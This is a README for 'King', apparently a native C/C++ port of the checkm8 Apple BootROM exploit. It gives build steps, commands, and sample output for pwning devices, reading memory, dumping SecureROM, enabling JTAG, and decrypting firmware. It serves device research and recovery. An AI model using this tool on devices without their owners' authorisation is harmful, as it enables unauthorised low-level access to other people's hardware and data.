<div align="center">

# 👑 King

**A fast, native C/C++ implementation of the [checkm8](https://github.com/axi0mX/ipwndfu) BootROM exploit.**

A ground-up port of [@axi0mX](https://twitter.com/axi0mx)'s `ipwndfu` with an integrated IMG4 toolkit, SecureROM dumping, and first-class Windows support — shipped as a single self-contained binary.

![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-informational)
![Language](https://img.shields.io/badge/language-C%2FC%2B%2B-00599C)
![Exploit](https://img.shields.io/badge/exploit-checkm8-critical)
![Dependencies](https://img.shields.io/badge/dependencies-libusb--1.0-success)

</div>

---

## Overview

`King` exploits the unpatchable **checkm8** BootROM vulnerability to place supported Apple devices into *pwned DFU mode*. From there it can read device memory, dump the SecureROM, enable JTAG, and decrypt firmware images — all from a single native executable with no scripting runtime required.

The exploit core is faithful to `ipwndfu`, including the delicate asynchronous USB timing and heap-grooming behaviour, and additionally embeds the [`gaster`](https://github.com/0x7ff/gaster) engine for the A8/A9 devices whose adaptive USB timing benefits from it.

## Why King instead of the original `ipwndfu`?

`ipwndfu` is the reference implementation and the work this project stands on. `King` is a practical re-engineering of it with a focus on portability, packaging, and an integrated toolchain:

| | **King** | `ipwndfu` (original) |
|---|:---:|:---:|
| Implementation | Native **C/C++** | Python 2 |
| Runtime dependencies | Just `libusb-1.0` | Python 2 + `libusb` + modules |
| **Windows support** | ✅ First-class (libusbK) | ❌ Not supported |
| Linux / macOS | ✅ | ✅ |
| Distribution | ✅ Single self-contained binary | Source tree + interpreter |
| checkm8 exploit | ✅ Faithful async timing + retry | ✅ |
| A8/A9 engine | ✅ Integrated `gaster` core | ✅ |
| SecureROM dump | ✅ `dump-rom` | ✅ |
| Memory read / hexdump | ✅ `read32` / `read64` / `hexdump` | ✅ (via console) |
| Enable JTAG (demote) | ✅ `enable_jtag` | ✅ |
| **Integrated IMG4 decryption** | ✅ `decryptIMG` (IM4P/KBAG + kernel unpack, built in) | ⚠️ Separate tooling |
| T8015 (A11) support | ✅ | ⚠️ Partial / community |

**In short:** where `ipwndfu` is a Python research toolkit tied to macOS/Linux, `King` is a portable native tool you can hand to someone as one `.exe` (or one small binary), that also folds firmware IMG4 decryption into the same command-line.

## Features

- 🚀 **Native performance, zero scripting runtime** — a single binary that links only against `libusb-1.0`.
- 🪟 **Runs on Windows, Linux and macOS** from the same codebase.
- 🎯 **Faithful checkm8 core** — asynchronous USB timing, large-leak handling, and automatic retry, matching the reference exploit.
- 🧩 **Integrated `gaster` engine** for robust A8/A9 exploitation.
- 🔍 **Device introspection** — `read32`, `read64`, and formatted `hexdump` of arbitrary addresses.
- 💾 **SecureROM dumping** straight to a named `.dump` file.
- 🔓 **JTAG enablement** via the demotion register.
- 📦 **Built-in IMG4 toolkit** — decrypt `IM4P` images, recover KBAGs/keys/IVs on the pwned device, and unpack (LZSS) kernels.

## Supported devices

| SoC | Devices |
|---|---|
| **T7000** | Apple TV (4th gen), HomePod, iPad mini 4, iPhone 6 / 6 Plus, iPod touch (6th gen) |
| **S8000 / S8003** | iPad (5th gen), iPhone 6s / 6s Plus, iPhone SE |
| **T8010** | iPad (6th gen), iPhone 7 / 7 Plus |
| **T8015** | iPhone 8 / 8 Plus / X *(experimental — reports welcome)* |

---

## Requirements

**All platforms**

- `libusb-1.0`
- A supported device in **DFU mode**

**Windows (additional)**

- The **libusbK** driver bound to the device, installed with [Zadig](https://zadig.akeo.ie/).
- `libusb-1.0` built with the long-path fix ([libusb/libusb#699](https://github.com/libusb/libusb/pull/699)) so libusbK device paths are not truncated. The official prebuilt libusb releases already include this fix.
- Run from an **Administrator** command prompt.

## Building

### Windows (MSVC)

Download a prebuilt [libusb release](https://github.com/libusb/libusb/releases) and place the headers and the static library where CMake expects them (the default is `c:/checkm8/libusb_win/`):

```
c:/checkm8/libusb_win/
├─ include/
│  ├─ libusb.h
│  └─ libusb-1.0/libusb.h
└─ lib/
   └─ libusb-1.0.lib        # the VS2022 x64 static lib
```

Then configure and build:

```bash
cmake -S . -B build -G "Visual Studio 17 2022" -A x64
cmake --build build --config Release
cp -R bin build/Release/        # payloads must sit next to the exe
```

The result, `build/Release/king.exe`, is self-contained (static libusb + static CRT) and needs no DLLs at runtime.

> 💡 Prefer a ready-to-run build? Grab the latest [**Windows release**](../../releases).

### Linux / macOS

Linux is the simplest and most reliable target — it talks to the device through
libusb directly, so there's **no driver binding** (no Zadig/libusbK/WinUSB), no
driver "flip" after the pwn, and the exploit timing is naturally good (none of
Windows' timer-quantization issues).

**1. Install libusb**
```bash
sudo apt install build-essential cmake libusb-1.0-0-dev   # Debian/Ubuntu
# macOS:  brew install libusb cmake
```

**2. Build**
```bash
cmake -S . -B build
cmake --build build
cp -R bin build/          # payloads must sit next to the binary
```

**3. (Optional) udev rule so you don't need `sudo`** — Linux only:
```bash
echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="05ac", MODE="0666"' | \
  sudo tee /etc/udev/rules.d/97-apple-dfu.rules
sudo udevadm control --reload-rules && sudo udevadm trigger
```
Without the rule, just run King with `sudo`.

**4. Run** (device in DFU)
```bash
sudo ./build/king checkm8        # -> PWND:[checkm8]
sudo ./build/king dump-rom
sudo ./build/king enable_jtag    # demote -> JTAG unlocked
```

> The same checkm8 reliability tips apply on any OS: on modern all-xHCI boards,
> routing the device through a **USB 2.0 hub** helps the exploit land. On Linux
> this matters less than on Windows, but it's still the most robust path.

---

## Usage

Run `king` with no arguments for the command list:

| Command | Description |
|---|---|
| `checkm8` | Execute the checkm8 exploit (enter pwned DFU mode) |
| `enable_jtag` | Enable JTAG on an exploited device (demotion) |
| `read32 <address>` | Read 32 bits from an address |
| `read64 <address>` | Read 64 bits from an address |
| `hexdump <address> <size>` | Print a hexdump of device memory |
| `dump-rom` | Dump the SecureROM to a file |
| `decryptIMG <file> [keybag]` | Decrypt an IM4P firmware image |

> On Linux/macOS prefix with `sudo`; on Windows run from an elevated prompt.

### Run the checkm8 exploit

```
sudo ./king checkm8
[*] Shellcode generated ...
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] stage 1, heap grooming ...
[*] stage 2, usb setup, send 0x800 of 'A', sends no data
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
[*] stage 3, exploit
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[!] Device is now in pwned DFU Mode! :D
```

> ⚠️ **On AMD X870 / modern all-xHCI boards, route the device through a USB 2.0 hub** — see [Running on AMD X870 & modern xHCI boards](#running-on-amd-x870--modern-xhci-boards) below.

### Read memory

```
sudo ./king read64 0x100000280
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] [100000280] = 36322D746F6F4269
```

```
sudo ./king read32 0x100000280
[*] Device Serial Number: CPID:8010 CPRV:11 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] [100000280] = 6F6F4269
```

### Enable JTAG (demote device)

Demotes the SoC (clears production bit 0 of the demotion register) so a JTAG/SWD
debugger — e.g. a LambdaConcept Bonobo cable with OpenOCD — can attach.

```
[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] DemotionReg: 287
[*] Setting Value...
[*] New DemotionReg: 286
[!] Succeeded to enable the JTAG!
```

On **A9 (S8000/S8003)** the demotion register `0x2102BC000` is peripheral MMIO
that the usbexec memcpy path faults on, so King instead invokes the SecureROM's
own demotion routine through the exec gadget. Verified on hardware (S8003,
iBoot-2234.0.0.2.22): the production bit flips `1 → 0`.

```
[*] A9: demoting via SecureROM routine (reg 0x2102BC000)
[*] production bit before: 1
[*] production bit after:  0
[!] Succeeded to enable the JTAG! (production bit cleared)
```

> Demotion is a RAM copy of the fuses — it resets to production on any reboot /
> fresh DFU, so re-run `checkm8` then `enable_jtag` each session.

### Decrypt and unpack an IM4P firmware image

```
sudo ./king decryptIMG iBoot.d10.RELEASE.im4p
decryptIMG4
IM4P: ---------
type: ibot
desc: iBoot-5540.0.129
size: 0x00072340

KBAG
num: 1
3c8b957e2bca7ce6e56b41f86490f535
9fde3e44de15dac204f895378d0e7eb03ecc2b67bb1958bb2c70508ea63875f5

[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
[*] Decrypted Key:
369......5CE
[*] Decrypted IV:
DF........E7
[!] File succesfully decrypted and written to: iBoot.d10.RELEASE.im4p_decrypted
```

### Hexdump

```
C:\src\King\build>Release\king.exe hexdump 0x100000200 0x90
[*] Device Serial Number: CPID:7000 ... SRTG:[iBoot-1992.0.0.1.19] PWND:[checkm8]
0000000100000200: 53 65 63 75 72 65 52 4f 4d 20 66 6f 72 20 74 37  SecureROM for t7
0000000100000210: 30 30 30 73 69 2c 20 43 6f 70 79 72 69 67 68 74  000si, Copyright
0000000100000220: 20 32 30 31 33 2c 20 41 70 70 6c 65 20 49 6e 63   2013, Apple Inc
0000000100000280: 69 42 6f 6f 74 2d 31 39 39 32 2e 30 2e 30 2e 31  iBoot-1992.0.0.1
```

### Dump the SecureROM

```
C:\src\King\build>Release\king.exe dump-rom
[*] Device Serial Number: CPID:7000 ... SRTG:[iBoot-1992.0.0.1.19] PWND:[checkm8]
Saved: SecureROM-t7000si-RELEASE-1992.0.0.1.19.dump
```

---

## Running on AMD X870 & modern xHCI boards

checkm8 wins a **~1 ms USB EP0 timing race**. Modern boards (e.g. AMD **X870** with a Ryzen 9000-series CPU) expose **only xHCI controllers** — there is no legacy EHCI USB 2.0 controller — and their native USB 3 ports are often *too fast and too clean* for the race to land. The exploit will run its full stage machine (RESET → SETUP → SPRAY → PATCH, looping) but **never reach `PWND`** when the device hangs directly off a USB 3 root hub.

**The fix: put a real USB 2.0 hub between the device and the PC.** A genuine 2.0 hub chip forces the Lightning link down to USB 2.0 HighSpeed timing, which is what the race needs.

### Step by step

1. **Insert a USB 2.0 hub in the path.** Any of these work:
   - A **Bonobo / Kanzi debug cable** — its inline USB 2.0 hub is ideal and purpose-built for this (verified working).
   - A cheap standalone **USB 2.0 hub** (the classic 4-port kind).
   - A **monitor/dock** with a built-in USB 2.0 hub.

   > A passthrough keyboard port, a USB **3.0** hub, or a direct motherboard port will **not** work — it must be a real 2.0 hub chip.

2. **Verify the hub is actually in the chain.** In PowerShell, trace the device's parent topology:
   ```powershell
   $d = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match 'VID_05AC' }
   $cur = $d.InstanceId
   while ($cur) {
     $p = Get-PnpDevice -InstanceId $cur -ErrorAction SilentlyContinue
     if (-not $p) { break }
     "  $($p.FriendlyName)  ($($p.Class))"
     $cur = (Get-PnpDeviceProperty -InstanceId $cur -KeyName 'DEVPKEY_Device_Parent' -ErrorAction SilentlyContinue).Data
   }
   ```
   You should see a **`Generic USB Hub`** node between the Apple device and the root hub. If you only see `USB Root Hub (USB 3.0) → AMD USB 3.10 eXtensible Host Controller`, the device is still direct — the hub isn't really in the path.

3. **Bind the libusbK driver** to the device in DFU mode with [Zadig](https://zadig.akeo.ie/) (do this *after* it's behind the hub, since the USB path changes).

4. **Run from an elevated prompt:**
   ```
   king.exe checkm8
   ```

5. **If control transfers stall / it hangs on `Waiting for the USB handle`**, re-enter DFU (or replug the device) once while King is waiting — Windows sometimes needs a fresh enumeration before it grabs the handle. King auto-retries and will latch on.

6. **Confirm success** — the device's own ID string ends with `PWND:[CHECKM8]`:
   ```powershell
   (Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match 'VID_05AC' }).InstanceId
   # ...SRTG:[IBOOT-...]_PWND:[CHECKM8]
   ```

> These reliability fixes (interface claim + `timeBeginPeriod(1)` timer resolution) are built into King; the USB 2.0 hub is the only extra hardware step needed on these boards.

---

## Credits

- [**@axi0mX**](https://twitter.com/axi0mx) — the [checkm8](https://github.com/axi0mX/ipwndfu) exploit and `ipwndfu`, which this project ports.
- [**0x7ff**](https://github.com/0x7ff/gaster) — the `gaster` engine used for A8/A9.
- All contributors to this port, including T8015 support.

## Disclaimer

This tool is provided for **security research, education, and device-recovery** on hardware you own or are authorised to test. checkm8 exploits a BootROM vulnerability; use it responsibly and at your own risk.
